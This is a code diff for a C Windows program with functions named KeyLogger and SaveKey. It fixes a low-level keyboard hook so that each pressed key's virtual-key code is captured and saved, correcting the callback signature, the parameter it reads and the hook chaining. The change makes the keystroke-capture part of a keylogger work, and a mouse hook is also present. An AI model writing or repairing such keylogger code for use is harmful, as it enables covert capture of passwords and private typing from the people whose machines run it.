@@ -197,15 +197,18 @@ LRESULT CALLBACK RawInputMouse(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
 }
 
-LRESULT CALLBACK RawInputKeyboard(HWND hwnd, int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK RawInputKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	if(nCode < 0)
+		return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
+	
 	if(nCode == WM_KEYDOWN)
 	{
-		KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)wParam;
+		KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
 		SaveKey(keyboard->vkCode);
 	}
 
-	return DefWindowProc(hwnd, nCode, wParam, lParam);
+	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
 }
 
 DWORD WINAPI KeyLogger()
